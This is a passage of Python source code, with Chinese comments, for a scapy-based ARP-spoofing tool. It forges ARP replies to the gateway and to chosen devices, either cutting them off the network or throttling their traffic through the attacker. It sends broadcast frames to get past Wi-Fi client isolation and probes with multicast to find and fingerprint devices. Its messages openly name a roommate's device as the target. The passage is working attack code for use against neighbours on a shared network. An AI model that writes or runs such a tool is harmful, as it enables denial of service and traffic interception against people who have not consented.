                d.hostname = ""   # 不阻塞式反查 DNS
            if gw_mac and d.ip != self.gateway and d.mac.lower() == gw_mac:
                d.is_proxy_arp = True
        self.log(f"发现 {len(devices)} 台在线设备。")
        return sorted(devices.values(), key=lambda x: ipaddress.IPv4Address(x.ip))

    # ---- 毒化 ------------------------------------------------------------ #
    def _pkt_to_target(self, t_mac: str, t_ip: str):
        """告诉目标：网关 IP 的 MAC 是我（网关方向被劫持）。

        broadcast=True 时用广播帧：客户端隔离通常只过滤单播，
        广播 ARP 应答仍会被 AP 转发给所有客户端，从而穿透隔离。
        """
        dst = "ff:ff:ff:ff:ff:ff" if self.broadcast else t_mac
        hwdst = "ff:ff:ff:ff:ff:ff" if self.broadcast else t_mac
        return Ether(dst=dst, src=self.adapter.mac) / ARP(
            op=2,
            psrc=self.gateway,
            hwsrc=self.adapter.mac,
            pdst=t_ip,
            hwdst=hwdst,
        )

    def _pkt_to_gateway(self, t_mac: str, t_ip: str):
        """告诉网关：目标的 IP 的 MAC 是我（回程方向被劫持）。"""
        return Ether(dst=self.gateway_mac, src=self.adapter.mac) / ARP(
            op=2,
            psrc=t_ip,
            hwsrc=self.adapter.mac,
            pdst=self.gateway,
            hwdst=self.gateway_mac,
        )

    def _restore_one(self, t_ip: str, t_mac: str, rounds: int = 5) -> None:
        """恢复真实映射：目标 ← 网关真实 MAC；网关 ← 目标真实 MAC。"""
        if not self.gateway_mac or not t_mac:
            return
        dst = "ff:ff:ff:ff:ff:ff" if self.broadcast else t_mac
        hwdst = "ff:ff:ff:ff:ff:ff" if self.broadcast else t_mac
        p_t = Ether(dst=dst, src=self.gateway_mac) / ARP(
            op=2, psrc=self.gateway, hwsrc=self.gateway_mac, pdst=t_ip, hwdst=hwdst
        )
        p_g = Ether(dst=self.gateway_mac, src=t_mac) / ARP(
            op=2, psrc=t_ip, hwsrc=t_mac, pdst=self.gateway, hwdst=self.gateway_mac
        )
        for _ in range(rounds):
            try:
                sendp([p_t, p_g], iface=self._iface(), verbose=0)
            except Exception:
                break
            time.sleep(0.2)

    def _loop(self) -> None:
        self.gateway_mac = self._resolve(self.gateway)
        if not self.gateway_mac:
            self.log("⚠ 拿不到网关真实 MAC，断网模式仍可生效，但可能较难自动恢复。")
        else:
            self.log(f"网关 {self.gateway} 真实 MAC = {self.gateway_mac}")

        if self.forward:
            self.log("模式：限速转发（对方仍能上网）")
        else:
            self.log("模式：强制断网（对方完全掉线）")

        self.log(f"开始投毒，间隔 {self.interval}s，目标 {len(self.targets)} 台。Ctrl+C / 点停止 = 自动恢复。")

        while not self._stop.is_set():
            batch = []
            targets = dict(self.targets)
            for t_ip, t_mac in targets.items():
                if self.spoof_gateway:
                    batch.append(self._pkt_to_target(t_mac, t_ip))
                if self.spoof_target and self.gateway_mac:
                    batch.append(self._pkt_to_gateway(t_mac, t_ip))
            if batch:
                try:
                    sendp(batch, iface=self._iface(), verbose=0)
                    with self._lock:
                        self._sent += len(batch)
                except PermissionError as e:
                    self.log(f"发包被拒（请用管理员运行）：{e}")
                    self._stop.wait(2)
                    continue
                except Exception as e:
                    self.log(f"发包异常：{e}")
            self._stop.wait(self.interval)

        self.log("停止投毒，正在恢复 ARP 表 …")
        for t_ip, t_mac in dict(self.targets).items():
            self._restore_one(t_ip, t_mac)
            self.log(f"已恢复 {t_ip}")
        if self.forward:
            disable_ip_forward()
        self.log("已收工，网络恢复正常。")

    # ---- 对外 API -------------------------------------------------------- #
    def add(self, ip: str, mac: Optional[str] = None) -> str:
        if ip == self.adapter.ip:
            raise NetError("不能把自己设为断网目标。")
        if ip == self.gateway:
            raise NetError("不能把网关设为断网目标（会把自己断网）。")
        if not mac:
            mac = self._resolve(ip)
        if not mac:
            if self.broadcast:
                # 广播毒化不需要目标真实 MAC（帧按广播发送），用占位即可
                mac = "ff:ff:ff:ff:ff:ff"
            else:
                raise NetError(
                    f"无法解析 {ip} 的 MAC 地址（设备可能已离线/不在同网段）。\n"
                    "如果该网络是代理ARP/客户端隔离，请保持『广播模式』勾选后再试。"
                )
        mac = _norm_mac(mac)
        if not self.broadcast and mac in ("ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00"):
            raise NetError(f"{ip} 的 MAC 非法：{mac}")
        self.targets[ip] = mac
        return mac

    def start(self, background: bool = True) -> None:
        require_admin()
        if not self.targets:
            raise NetError("没有指定目标。请先扫描并选择室友的设备。")
        self._stop.clear()
        if self.forward:
            ok, msg = enable_ip_forward()
            self.log(msg)

        def run():
            try:
                self._loop()
            except Exception as e:  # 保证 UI 不崩
                self.log(f"运行出错：{e}")

        self._thread = threading.Thread(target=run, name="arp-killer", daemon=True)
        self._thread.start()
        if not background:
            self.wait()

    def wait(self) -> None:
        if self._thread:
            while self._thread.is_alive():
                self._thread.join(0.3)

    def stop(self) -> None:
        self._stop.set()
        if self._thread and self._thread is not threading.current_thread():
            self._thread.join(3.0)

    @property
    def running(self) -> bool:
        return bool(self._thread and self._thread.is_alive() and not self._stop.is_set())

    @property
    def sent(self) -> int:
        with self._lock:
            return self._sent


# --------------------------------------------------------------------------- #
# 目标连通性探测（断网时判断对方是否还有网络）
# --------------------------------------------------------------------------- #
def probe_device(adapter: "Adapter", ip: str, timeout: float = 0.8,
                 ports: Tuple[int, ...] = (80, 443, 22, 445)) -> Dict:
    """三层探测：ARP 在线 / ICMP 可达 / TCP 端口响应（并发执行，总耗时约 1~2 秒）。

    返回 dict：
      arp_mac   : 有回应时目标 MAC（说明对方在线、二层可达）
      icmp_ok   : ping 是否通
      tcp       : {port: "open"/"closed"}，只含收到回应的端口
      responded : 是否有任何回应
      error     : 探测过程中的错误（如有）
    """
    from concurrent.futures import ThreadPoolExecutor

    res: Dict = {"ip": ip, "arp_mac": None, "icmp_ok": False,
                 "tcp": {}, "responded": False, "error": ""}
    iface = adapter.device

    def _arp():
        try:
            ans = srp1(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                iface=iface, timeout=timeout, verbose=0,
            )
            return _norm_mac(ans.hwsrc) if ans is not None else None
        except Exception as e:
            return ("ERR", str(e))

    def _icmp():
        try:
            return sr1(IP(dst=ip) / ICMP(), timeout=timeout, verbose=0) is not None
        except Exception:
            return False

    def _tcp(port):
        try:
            p = sr1(IP(dst=ip) / TCP(dport=port, flags="S"),
                    timeout=timeout, verbose=0)
            if p is not None and p.haslayer(TCP):
                return "open" if (int(p[TCP].flags) & 0x12) == 0x12 else "closed"
        except Exception:
            pass
        return None

    with ThreadPoolExecutor(max_workers=2 + len(ports)) as ex:
        f_arp = ex.submit(_arp)
        f_icmp = ex.submit(_icmp)
        f_tcp = {p: ex.submit(_tcp, p) for p in ports}
        try:
            v = f_arp.result(timeout=timeout + 1.5)
            if isinstance(v, tuple) and v and v[0] == "ERR":
                res["error"] = f"ARP: {v[1]}"
            else:
                res["arp_mac"] = v
        except Exception:
            pass
        try:
            res["icmp_ok"] = bool(f_icmp.result(timeout=timeout + 1.5))
        except Exception:
            pass
        for port, fut in f_tcp.items():
            try:
                st = fut.result(timeout=timeout + 1.5)
            except Exception:
                st = None
            if st:
                res["tcp"][port] = st
    res["responded"] = bool(res["arp_mac"] or res["icmp_ok"] or res["tcp"])
    return res


# --------------------------------------------------------------------------- #
# 组播 / 广播探测（穿透客户端隔离）
# --------------------------------------------------------------------------- #
_SSDP_REQ = (
    b"M-SEARCH * HTTP/1.1\r\n"
    b"HOST: 239.255.255.250:1900\r\n"
    b"MAN: \"ssdp:discover\"\r\n"
    b"MX: 2\r\n"
    b"ST: ssdp:all\r\n\r\n"
)


def _build_multicast_probes(adapter: "Adapter") -> list:
    """构造 SSDP / mDNS / NetBIOS / LLMNR / 广播 ICMP 探测包。

    依据：客户端隔离通常只过滤「客户端间单播」，广播与组播照常转发，
    因此用组播协议做发现可以绕过一部分隔离实现。
    """
    from scapy.layers.dns import DNS, DNSQR
    from scapy.layers.netbios import NBNSQueryRequest

    probes = []
    try:
        probes.append(
            Ether(dst="01:00:5e:7f:ff:fa") / IP(dst="239.255.255.250", ttl=4)
            / UDP(sport=1900, dport=1900) / _SSDP_REQ
        )
    except Exception:
        pass
    try:
        probes.append(
            Ether(dst="01:00:5e:00:00:fb") / IP(dst="224.0.0.251", ttl=255)
            / UDP(sport=5353, dport=5353)
            / DNS(id=0, qr=0, qd=DNSQR(qname="_services._dns-sd._udp.local", qtype="PTR"))
        )
    except Exception:
        pass
    try:
        probes.append(
            Ether(dst="ff:ff:ff:ff:ff:ff") / IP(dst="255.255.255.255", ttl=1)
            / UDP(sport=137, dport=137)
            / NBNSQueryRequest(NAME_TRN_ID=random.randint(0x1000, 0xFFFF),
                               QUESTION_NAME="*", QUESTION_TYPE="NBSTAT")
        )
    except Exception:
        pass
    try:
        probes.append(
            Ether(dst="01:00:5e:00:00:fc") / IP(dst="224.0.0.252", ttl=1)
            / UDP(sport=5355, dport=5355)
            / DNS(id=1, qr=0, qd=DNSQR(qname="localhost", qtype="A"))
        )
    except Exception:
        pass
    try:
        probes.append(
            Ether(dst="ff:ff:ff:ff:ff:ff")
            / IP(dst="255.255.255.255") / ICMP()
        )
    except Exception:
        pass
    return probes


_SERVICE_HINTS = {
    "_companion-link": "Apple 设备（iPhone/iPad/Mac）",
    "_device-info": "Apple 设备",
    "_airplay": "Apple 投屏设备",
    "_raop": "AirPlay 音频设备",
    "_googlecast": "Chromecast/电视",
    "_hap": "HomeKit 智能设备",
    "_miio": "小米智能设备",
    "_smb": "文件共享设备",
    "_workstation": "Windows 电脑",
    "_ipp": "网络打印机",
    "_printer": "网络打印机",
    "_spotify-connect": "Spotify 设备",
    "_ssh": "SSH 设备（Linux/Mac）",
    "_sftp-ssh": "SSH 设备",
    "_http": "Web 设备",
    "_rdlink": "远程桌面设备",
}


def _device_hint(info: str, proto: str = "") -> str:
    """根据 mDNS 服务名 / 主机名推断设备类型，帮助识别是哪台设备。"""
    low = (info or "").lower()
    for key, name in _SERVICE_HINTS.items():
        if key in low:
            return name
    if "desktop-" in low or "laptop-" in low:
        return "Windows 电脑"
    if "android" in low:
        return "Android 设备"
    if "iphone" in low or "ipad" in low or "macbook" in low:
        return "Apple 设备"
    if "printer" in low or "hp-" in low or "epson" in low:
        return "打印机"
    if "tv" in low or "cast" in low or "roku" in low:
        return "电视/投屏"
    if "server" in low:
        return "服务器"
    return ""


def probe_multicast(adapter: "Adapter", timeout: float = 3.0) -> List[Dict]:
    """发组播/广播探测并收集响应，返回发现的设备列表。

    每条：{ip, mac, proto, info, vendor, hint}
    """
    from scapy.layers.dns import DNS
    from scapy.layers.netbios import NBNSHeader, NBNSNodeStatusResponse

    probes = _build_multicast_probes(adapter)
    found: Dict[str, Dict] = {}
    if not probes:
        return []

    def _on_pkt(p) -> None:
        try:
            if not p.haslayer("IP"):
                return
            src = p["IP"].src
            if src.startswith(("127.", "0.")) or src == adapter.ip:
                return
            # 只保留局域网内响应（/16 覆盖校园网，/24 覆盖家用网）
            try:
                ip_obj = ipaddress.IPv4Address(src)
                lan16 = ipaddress.IPv4Network(f"{adapter.ip}/16", strict=False)
                lan24 = ipaddress.IPv4Network(f"{adapter.ip}/24", strict=False)
                if not (ip_obj in lan16 or ip_obj in lan24):
                    return
            except Exception:
                return
            proto = ""
            info = ""
            if p.haslayer("UDP"):
                dport = int(p["UDP"].sport)
                if dport == 1900:
                    proto = "SSDP"
                    raw = bytes(p["UDP"].payload)
                    for key in (b"SERVER:", b"ST:", b"USN:", b"LOCATION:"):
                        idx = raw.find(key)
                        if idx >= 0:
                            seg = raw[idx:idx + 120].split(b"\r\n")[0].decode(
                                "utf-8", "ignore"
                            )
                            info = (info + " " + seg).strip()
                elif dport == 5353:
                    proto = "mDNS"
                    if p.haslayer(DNS):
                        dns = p[DNS]
                        names = []
                        try:
                            for i in range(int(dns.ancount or 0)):
                                rr = dns[i]
                                for attr in ("rrname", "rdata"):
                                    v = getattr(rr, attr, None)
                                    if isinstance(v, bytes):
                                        v = v.decode("utf-8", "ignore")
                                    if isinstance(v, str) and v:
                                        names.append(v.rstrip("."))
                        except Exception:
                            pass
                        if names:
                            info = names[0]
                            # 优先取服务类型名（_airplay._tcp.local 等），便于识别设备
                            for n in names:
                                if "._tcp" in n or "._udp" in n:
                                    info = n
                                    break
                elif dport == 137:
                    proto = "NetBIOS"
                    try:
                        # NetBIOS 节点状态响应里带计算机名（如 DESKTOP-ABC）
                        import re as _re
                        raw = bytes(p["UDP"].payload)
                        cands = _re.findall(rb"[A-Z][A-Z0-9\-_]{2,14}", raw)
                        for c in cands:
                            s = c.decode("ascii", "ignore").strip()
                            # 只接受带分隔符的典型计算机名，过滤随机字节串
                            if len(s) >= 4 and ("-" in s or "_" in s):
                                info = s
                                break
                    except Exception:
                        pass
                elif dport == 5355:
                    proto = "LLMNR"
                else:
                    proto = f"UDP:{dport}"
            elif p.haslayer("ICMP"):
                if int(p["ICMP"].type) == 0:      # echo reply
                    proto = "ICMP"
            if not proto:
                return
            mac = _norm_mac(p["Ether"].src) if p.haslayer("Ether") else ""
            dev = found.setdefault(src, {"ip": src, "mac": mac,
                                         "proto": set(), "info": "",
                                         "vendor": _vendor(mac) if mac else ""})
            dev["proto"].add(proto)
            if mac and not dev.get("vendor"):
                dev["vendor"] = _vendor(mac)
            if info and not dev["info"]:
                dev["info"] = info
            if mac and not dev["mac"]:
                dev["mac"] = mac
        except Exception:
            pass

    try:
        sendp(probes, iface=adapter.device, verbose=0, inter=0.05)
        sniff(iface=adapter.device, timeout=timeout, store=False,
              prn=_on_pkt, lfilter=lambda x: x.haslayer("IP"))
    except Exception:
        pass

    out = []
    for d in found.values():
        d["proto"] = ",".join(sorted(d["proto"]))
        d["hint"] = _device_hint(d.get("info", ""), d["proto"])
        out.append(d)
    out.sort(key=lambda x: ipaddress.IPv4Address(x["ip"]))
    return out


# --------------------------------------------------------------------------- #
# 网关发现辅助（给 CLI 用）
# --------------------------------------------------------------------------- #
def find_gateway_mac(ip: str, iface: str) -> Optional[str]:
    mac = getmacbyip(ip)
    if mac:
        return _norm_mac(mac)
    try:
        ans = srp1(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            iface=iface, timeout=1.5, verbose=0,
        )
        return _norm_mac(ans.hwsrc) if ans is not None else None
    except Exception:
        return None
